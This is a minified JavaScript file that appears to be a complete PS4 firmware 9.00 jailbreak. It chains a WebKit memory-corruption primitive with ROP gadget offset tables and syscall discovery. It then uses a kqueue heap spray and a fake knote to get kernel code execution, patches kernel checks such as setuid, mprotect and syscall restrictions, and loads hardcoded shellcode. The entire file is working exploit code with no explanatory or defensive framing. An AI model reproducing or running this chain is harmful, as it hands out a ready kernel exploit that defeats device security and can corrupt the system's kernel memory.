var chain;var kchain;var kchain2;var SAVED_KERNEL_STACK_PTR;var KERNEL_BASE_PTR;var webKitBase;var webKitRequirementBase;var libSceLibcInternalBase;var libKernelBase;var textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072;const OFFSET_WK_memset_import=680;const OFFSET_WK___stack_chk_fail_import=376;const OFFSET_WK_psl_builtin_import=3432;const OFFSET_WKR_psl_builtin=211872;const OFFSET_WK_setjmp_gadget_one=17214711;const OFFSET_WK_setjmp_gadget_two=32301523;
const OFFSET_WK_longjmp_gadget_one=17214711;const OFFSET_WK_longjmp_gadget_two=32301523;const OFFSET_libcint_memset=325648;const OFFSET_libcint_setjmp=767420;const OFFSET_libcint_longjmp=767510;const OFFSET_WK2_TLS_IMAGE=59670560;const OFFSET_lk___stack_chk_fail=130912;const OFFSET_lk_pthread_create=152848;const OFFSET_lk_pthread_join=44960;var nogc=[];var syscalls={};var gadgets={};
var wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,
infloop:32255,"mov [rax], cl":814767};var wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480};var wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538};var hmd_gadgetmap={"add [r8], r12":179425};var ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};
function userland(){p.launch_chain=launch_chain;p.malloc=malloc;p.malloc32=malloc32;p.stringify=stringify;p.array_from_address=array_from_address;p.readstr=readstr;var textAreaVtPtr=p.read8(p.leakval(textArea).add32(24));var textAreaVtable=p.read8(textAreaVtPtr);webKitBase=p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);libSceLibcInternalBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);libKernelBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);webKitRequirementBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);for(var gadget in wk_gadgetmap)window.gadgets[gadget]=webKitBase.add32(wk_gadgetmap[gadget]);for(var gadget in wkr_gadgetmap)window.gadgets[gadget]=webKitRequirementBase.add32(wkr_gadgetmap[gadget]);function get_jmptgt(address){var instr=p.read4(address)&65535;var offset=p.read4(address.add32(2));
if(instr!=9727)return 0;return address.add32(6+offset)}function malloc(sz){var backing=new Uint8Array(65536+sz);window.nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=backing;return ptr}function malloc32(sz){var backing=new Uint8Array(65536+sz*4);window.nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=new Uint32Array(backing.buffer);return ptr}function array_from_address(addr,size){var og_array=new Uint32Array(4096);var og_array_i=p.leakval(og_array).add32(16);
p.write8(og_array_i,addr);p.write4(og_array_i.add32(8),size);p.write4(og_array_i.add32(12),1);nogc.push(og_array);return og_array}function stringify(str){var bufView=new Uint8Array(str.length+1);for(var i=0;i<str.length;i++)bufView[i]=str.charCodeAt(i)&255;window.nogc.push(bufView);return p.read8(p.leakval(bufView).add32(16))}function readstr(addr){var str="";for(var i=0;;i++){var c=p.read1(addr.add32(i));if(c==0)break;str+=String.fromCharCode(c)}return str}var fakeVtable_setjmp=p.malloc32(512);var fakeVtable_longjmp=
p.malloc32(512);var original_context=p.malloc32(64);var modified_context=p.malloc32(64);p.write8(fakeVtable_setjmp.add32(0),fakeVtable_setjmp);p.write8(fakeVtable_setjmp.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two));p.write8(fakeVtable_setjmp.add32(16),original_context);p.write8(fakeVtable_setjmp.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));p.write8(fakeVtable_setjmp.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one));p.write8(fakeVtable_longjmp.add32(0),fakeVtable_longjmp);
p.write8(fakeVtable_longjmp.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two));p.write8(fakeVtable_longjmp.add32(16),modified_context);p.write8(fakeVtable_longjmp.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));p.write8(fakeVtable_longjmp.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));function launch_chain(chain){chain.push(window.gadgets["pop rdi"]);chain.push(original_context);chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));p.write8(textAreaVtPtr,
fakeVtable_setjmp);textArea.scrollLeft=0;p.write8(modified_context.add32(0),window.gadgets["ret"]);p.write8(modified_context.add32(16),chain.stack);p.write8(modified_context.add32(64),p.read8(original_context.add32(64)));p.write8(textAreaVtPtr,fakeVtable_longjmp);textArea.scrollLeft=0;p.write8(textAreaVtPtr,textAreaVtable)}var kview=new Uint8Array(4096);var kstr=p.leakval(kview).add32(16);var orig_kview_buf=p.read8(kstr);p.write8(kstr,window.libKernelBase);p.write4(kstr.add32(8),262144);var countbytes;
for(var i=0;i<262144;i++)if(kview[i]==114&&kview[i+1]==100&&kview[i+2]==108&&kview[i+3]==111&&kview[i+4]==99){countbytes=i;break}p.write4(kstr.add32(8),countbytes+32);var dview32=new Uint32Array(1);var dview8=new Uint8Array(dview32.buffer);for(var i=0;i<countbytes;i++)if(kview[i]==72&&kview[i+1]==199&&kview[i+2]==192&&kview[i+7]==73&&kview[i+8]==137&&kview[i+9]==202&&kview[i+10]==15&&kview[i+11]==5){dview8[0]=kview[i+3];dview8[1]=kview[i+4];dview8[2]=kview[i+5];dview8[3]=kview[i+6];var syscallno=
dview32[0];window.syscalls[syscallno]=window.libKernelBase.add32(i)}p.write8(kstr,orig_kview_buf);chain=new rop;if(chain.syscall(20).low==0){alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");while(1);}}function run_hax(){userland();if(chain.syscall(23,0).low!=0)kernel();else LoaderPL()}function kernel(){extra_gadgets();kchain_setup();object_setup();trigger_spray()}var handle;var random_path;var ex_info;
function load_prx(name){var res=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${name}`),0,handle,0);if(res.low!=0)alert("failed to load prx/get handle "+name);p.write8(ex_info,424);res=chain.syscall(608,p.read4(handle),0,ex_info);if(res.low!=0)alert("failed to get module info from handle");var tlsinit=p.read8(ex_info.add32(272));var tlssize=p.read4(ex_info.add32(284));if(tlssize!=0)if(name=="libSceWebKit2.sprx")tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);else alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
return tlsinit}
function extra_gadgets(){handle=p.malloc(488);var randomized_path_length_ptr=handle.add32(4);var randomized_path_ptr=handle.add32(20);ex_info=randomized_path_ptr.add32(64);p.write8(randomized_path_length_ptr,44);chain.syscall(602,0,randomized_path_ptr,randomized_path_length_ptr);random_path=p.readstr(randomized_path_ptr);var ipmi_addr=load_prx("libSceIpmi.sprx");var hmd_addr=load_prx("libSceHmd.sprx");var wk2_addr=load_prx("libSceWebKit2.sprx");for(var gadget in hmd_gadgetmap)window.gadgets[gadget]=hmd_addr.add32(hmd_gadgetmap[gadget]);
for(var gadget in wk2_gadgetmap)window.gadgets[gadget]=wk2_addr.add32(wk2_gadgetmap[gadget]);for(var gadget in ipmi_gadgetmap)window.gadgets[gadget]=ipmi_addr.add32(ipmi_gadgetmap[gadget]);for(var gadget in window.gadgets){p.read8(window.gadgets[gadget]);chain.fcall(window.syscalls[203],window.gadgets[gadget],16)}chain.run()}
function kchain_setup(){const KERNEL_busy=28478968;const KERNEL_bcopy=2765;const KERNEL_bzero=2561021;const KERNEL_pagezero=2561089;const KERNEL_memcpy=2561213;const KERNEL_pagecopy=2561281;const KERNEL_copyin=2561709;const KERNEL_copyinstr=2562909;const KERNEL_copystr=2563117;const KERNEL_setidt=3222592;const KERNEL_setcr0=2079049;const KERNEL_Xill=1561856;const KERNEL_veriPatch=6449268;const KERNEL_enable_syscalls_1=1168;const KERNEL_enable_syscalls_2=1205;const KERNEL_enable_syscalls_3=1209;const KERNEL_enable_syscalls_4=
1218;const KERNEL_mprotect=527245;const KERNEL_prx=2338500;const KERNEL_dlsym_1=2340479;const KERNEL_dlsym_2=2235200;const KERNEL_setuid=6662;const KERNEL_syscall11_1=17827104;const KERNEL_syscall11_2=17827112;const KERNEL_syscall11_3=17827148;const KERNEL_syscall11_gadget=313261;const KERNEL_mmap_1=1467178;const KERNEL_mmap_2=1467181;const KERNEL_setcr0_patch=3857979;const KERNEL_kqueue_close_epi=3770769;SAVED_KERNEL_STACK_PTR=p.malloc(512);KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8);p.write8(KERNEL_BASE_PTR,
new int64(4286636900,4294967295));kchain=new rop;kchain2=new rop;{chain.fcall(window.syscalls[203],kchain.stackback,262144);chain.fcall(window.syscalls[203],kchain2.stackback,262144);chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16)}chain.run();kchain.count=0;kchain2.count=0;kchain.set_kernel_var(KERNEL_BASE_PTR);kchain2.set_kernel_var(KERNEL_BASE_PTR);kchain.push(gadgets["pop rax"]);kchain.push(SAVED_KERNEL_STACK_PTR);kchain.push(gadgets["mov [rax], rdi"]);kchain.push(gadgets["pop r8"]);
kchain.push(KERNEL_BASE_PTR);kchain.push(gadgets["add [r8], r12"]);kchain.kwrite1(KERNEL_busy,1);kchain.push(gadgets["sti"]);var idx1=kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);var idx2=kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);kchain.push(gadgets["pop rdi"]);kchain.push(6);kchain.push(gadgets["pop rsi"]);kchain.push(gadgets["mov rsp, rdi"]);kchain.push(gadgets["pop rdx"]);kchain.push(14);kchain.push(gadgets["pop rcx"]);kchain.push(0);kchain.push(gadgets["pop r8"]);kchain.push(0);
var idx1_dest=kchain.get_rsp();kchain.pushSymbolic();kchain.push(gadgets["pop rsi"]);kchain.push(2147745843);kchain.push(gadgets["pop rdi"]);kchain.push(kchain2.stack);var idx2_dest=kchain.get_rsp();kchain.pushSymbolic();kchain.finalizeSymbolic(idx1,idx1_dest);kchain.finalizeSymbolic(idx2,idx2_dest);kchain2.kwrite2(KERNEL_veriPatch,37008);kchain2.kwrite1(KERNEL_bcopy,235);kchain2.kwrite1(KERNEL_bzero,235);kchain2.kwrite1(KERNEL_pagezero,235);kchain2.kwrite1(KERNEL_memcpy,235);kchain2.kwrite1(KERNEL_pagecopy,
235);kchain2.kwrite1(KERNEL_copyin,235);kchain2.kwrite1(KERNEL_copyinstr,235);kchain2.kwrite1(KERNEL_copystr,235);kchain2.kwrite1(KERNEL_busy,0);var idx3=kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);var idx4=kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);kchain2.push(gadgets["pop rdi"]);kchain2.push(6);kchain2.push(gadgets["pop rsi"]);var idx3_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.push(gadgets["pop rdx"]);kchain2.push(14);kchain2.push(gadgets["pop rcx"]);kchain2.push(0);
kchain2.push(gadgets["pop r8"]);kchain2.push(0);var idx4_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx3,idx3_dest);kchain2.finalizeSymbolic(idx4,idx4_dest);kchain2.kwrite4(KERNEL_enable_syscalls_1,0);kchain2.kwrite1(KERNEL_enable_syscalls_4,235);kchain2.kwrite2(KERNEL_enable_syscalls_3,37008);kchain2.kwrite2(KERNEL_enable_syscalls_2,37008);kchain2.kwrite1(KERNEL_setuid,235);kchain2.kwrite4(KERNEL_mprotect,0);kchain2.kwrite2(KERNEL_prx,59792);kchain2.kwrite1(KERNEL_dlsym_1,
235);kchain2.kwrite4(KERNEL_dlsym_2,3284152648);kchain2.kwrite1(KERNEL_mmap_1,55);kchain2.kwrite1(KERNEL_mmap_2,55);kchain2.kwrite4(KERNEL_syscall11_1,2);kchain2.kwrite8_kaddr(KERNEL_syscall11_2,KERNEL_syscall11_gadget);kchain2.kwrite4(KERNEL_syscall11_3,1);kchain2.kwrite4(KERNEL_setcr0_patch,3284607503);var idx5=kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);kchain2.push(gadgets["pop rdi"]);kchain2.push(2147811379);var idx5_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx5,
idx5_dest);kchain2.rax_kernel(KERNEL_kqueue_close_epi);kchain2.push(gadgets["mov rdx, rax"]);kchain2.push(gadgets["pop rsi"]);kchain2.push(SAVED_KERNEL_STACK_PTR);kchain2.push(gadgets["mov rax, [rsi]"]);kchain2.push(gadgets["pop rcx"]);kchain2.push(16);kchain2.push(gadgets["add rax, rcx"]);kchain2.push(gadgets["mov [rax], rdx"]);kchain2.push(gadgets["pop rdi"]);var idx6=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]);kchain2.push(gadgets["sti"]);kchain2.push(gadgets["pop rsp"]);var idx6_dest=
kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx6,idx6_dest)}
function object_setup(){var fake_knote=chain.syscall(477,16384,16384*3,3,4112,4294967295,0);var fake_filtops=fake_knote.add32(16384);var fake_obj=fake_knote.add32(32768);if(fake_knote.low!=16384){alert("enomem: "+fake_knote);while(1);}{p.write8(fake_knote,fake_obj);p.write8(fake_knote.add32(104),fake_filtops)}{p.write8(fake_filtops.sub32(121),gadgets["cli ; pop rax"]);p.write8(fake_filtops.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);p.write8(fake_filtops.add32(8),kchain.stack);p.write8(fake_filtops.add32(16),
gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"])}{p.write8(fake_obj.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"])}chain.syscall(203,fake_knote,49152)}
var trigger_spray=function(){var NUM_KQUEUES=432;var kqueue_ptr=p.malloc(NUM_KQUEUES*4);{for(var i=0;i<NUM_KQUEUES;i++){chain.fcall(window.syscalls[362]);chain.write_result4(kqueue_ptr.add32(4*i))}}chain.run();var kqueues=p.array_from_address(kqueue_ptr,NUM_KQUEUES);var that_one_socket=chain.syscall(97,2,1,0);if(that_one_socket.low<256||that_one_socket.low>=512){alert("invalid socket");while(1);}var kevent=p.malloc(32);p.write8(kevent.add32(0),that_one_socket);p.write4(kevent.add32(8),65535+65536);
p.write4(kevent.add32(12),0);p.write8(kevent.add32(16),0);p.write8(kevent.add32(24),0);{for(var i=0;i<NUM_KQUEUES;i++)chain.fcall(window.syscalls[363],kqueues[i],kevent,1,0,0,0)}chain.run();{for(var i=18;i<NUM_KQUEUES;i+=2)chain.fcall(window.syscalls[6],kqueues[i])}chain.run();enableUSB();waitForUSB().then(()=>{{for(var i=1;i<NUM_KQUEUES;i+=2)chain.fcall(window.syscalls[6],kqueues[i])}chain.run();if(chain.syscall(23,0).low==0){{chain.fcall(window.syscalls[73],16384,49152);chain.fcall(window.syscalls[325])}chain.run();
disableUSB();patch_once();LoaderPL();if(window.XHOST_USB_MODE==="auto")window.parent.notify("Jailbreak Done");else window.parent.notify("Jailbreak Done<br/>Please UNPLUG the USB drive")}else{disableUSB();alert(`
      \u274c Failed to trigger exploit
      \u26a0 Kernel heap might be corrupted.
      \ud83d\udd03 try again or \ud83e\udde8 reboot the console`);p.write8(0,0)}})};
var patch_once=function(){var patch_buffer=chain.syscall(477,0,16384,7,4096,4294967295,0);var patch_buffer_view=p.array_from_address(patch_buffer,4096);[3E3,4270409728,54365512,251658240,1213580037,2336810377,2515011710,3892314112,373,53876223,2336751616,210749,1066092544,1962902856,1032669419,669,4181035848,1207959554,52565387,2336751616,14084114,2370306048,171837,898320384,740,85297992,1207959555,3118994059,1207959552,40058253,2336751616,180021,361449472,712,3893529416,156,2050854216,1207959554,
44709259,2336751616,174869,311117824,32744,25552896,3277651968,1832749384,1207959554,40779009,21495808,159549,1023494144,624,1899823432,1207959554,41041153,21495808,168765,1023494144,660,1698496840,1207959554,40254721,21495808,165693,1023494144,648,2302476616,1207959554,42614017,21495808,166717,1023494144,588,1027408200,3271557122,3850979413,283935560,607422792,609519944,3977641736,1207959553,1265942661,1220708680,1212170379,796180613,678988616,607927112,2336754292,3229960192,3974831476,410553160,
1962902856,2139834605,2084259856,3799320612,4279255239,1224736767,823163533,835858934,2769682377,1207959553,1561379971,2303219139,3223326693,4294911304,571473918,1032538304,456,2425358279,1204261008,1217433604,898320568,428,142051656,1695565767,3342633800,2430023,1204224E3,2303197208,474466104,3091763344,2100661064,1207959553,3340793737,3343394887,1204224256,44,2005747945,361449524,336,2314348872,2336763991,92981,1452099584,3609806853,3242786697,2168981735,59855,1049184256,3400,571408385,1438866880,
266701128,625524768,4294901759,1220551183,20594059,130482176,12828721,893225800,3338665985,3284152583,1032538112,304,3224438727,2336751811,76605,822593280,1208009664,10894731,2277965824,2039297,2425419313,503678919,3375431711,2278002832,2039305,2425410097,507414471,3375431711,222859408,65536,4290781711,61205,3223326464,4294911304,571473918,1032538304,220,3224438727,222822595,65536,1572872719,1937339331,1601004916,1886614899,1600417381,1935763568,1885287013,1935631730,6516345,1953724787,1918856549,
1836413797,1752194917,845509473,1937339136,1601004916,1970496882,1885300077,1702060392,2425356339,0,0,1018096,0,3076464,0,101872,0,102128,0,40190224,0,619056,0,4206176,0,22151432,0,22151424,0,4599072,0,4599292,0,6445472,0,6449360,0,6446528,0,6447760,0,6448928,0].forEach((value,idx)=>{patch_buffer_view[idx]=value});{chain.fcall(window.syscalls[203],patch_buffer,16384);chain.fcall(patch_buffer,p.read8(KERNEL_BASE_PTR));chain.fcall(window.syscalls[73],patch_buffer,16384)}chain.run()};
